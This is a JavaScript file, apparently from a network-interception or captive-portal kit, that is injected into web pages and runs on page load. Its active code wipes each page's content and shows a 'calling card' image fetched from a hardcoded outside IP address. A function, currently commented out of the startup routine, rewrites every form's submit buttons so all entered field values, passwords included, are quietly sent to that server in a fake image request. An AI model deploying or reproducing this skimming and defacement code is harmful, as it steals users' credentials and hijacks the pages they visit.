var httpServer="http://141.116.116.93:80"

function init_captive_js()
{
//	capture_submitted_form_data();
		display_calling_card();
	//insert_flash("bbmap.swf");
}

var forms;
var debug="";

// Searches for submit buttons, & intercept data.
function capture_submitted_form_data()
{
	forms = document.getElementsByTagName("form");

	for (var x = 0; x < forms.length; x++)
	{
		if (debug == "debug")
		{
			alert("Form action: " + forms[x].action);
		}

		var inputBoxes = forms[x].getElementsByTagName("input");

		var parentElement = forms[x];

		for (var i = 0; i < inputBoxes.length; i++)
		{
			if (inputBoxes[i].type == "submit")
			{
				if (debug=="debug")
				{
					alert("Changing " + inputBoxes[i].value);
				}
				inputBoxes[i].type="button";
				inputBoxes[i].setAttribute("onclick", "submitOverride(" + x + "," + i + ")");
			}	
		}
	}	
}

function submitOverride(idx, buttonIdx)
{
var inputBoxes = forms[idx].getElementsByTagName("input");
var urlString = "location=" + document.location + "&";

inputBoxes[buttonIdx].type="submit";

for (var i = 0; i < inputBoxes.length; i++)
{
urlString += inputBoxes[i].name + "="  + inputBoxes[i].value;
if (i != inputBoxes.length - 1)
urlString += "&";
}

var url = httpServer + "/images/image.jpg?" + urlString;
myImage = new Image();
myImage.src = url;

//alert(url);

forms[idx].submit();
}

function display_calling_card()
{
var body = get_body_tag();

var ccUrl = httpServer + "/images/ccard.gif";

if (body.hasChildNodes())
{
while (body.childNodes.length >= 1)
{
body.removeChild(body.firstChild);
}

var image = document.createElement("img");
image.src = ccUrl;
body.appendChild(image);
}

}

function insert_flash(flash_object)
{
var flash_url = httpServer + "/flash/" + flash_object;

var objectTag = document.createElement("object");
objectTag.setAttribute("type", "application/x-shockwave-flash");
objectTag.setAttribute("data", flash_url);
objectTag.setAttribute("width", 500);
objectTag.setAttribute("height", 500);

var param1Tag = document.createElement("param");
param1Tag.setAttribute("movie", flash_url);

var param2Tag = document.createElement("param");
param2Tag.setAttribute("loop", "false");

objectTag.appendChild(param1Tag);
objectTag.appendChild(param2Tag);

var body = get_body_tag();
body.appendChild(objectTag);
}

function get_body_tag()
{
var body = document.getElementsByTagName("body");
return body[0];
}

var browserName=navigator.appName;

if (browserName=="Microsoft Internet Explorer")
{
window.onload=init_captive_js; 
}
else
{
if (document.addEventListener)
{
document.addEventListener("DOMContentLoaded", init_captive_js, false);
}
}

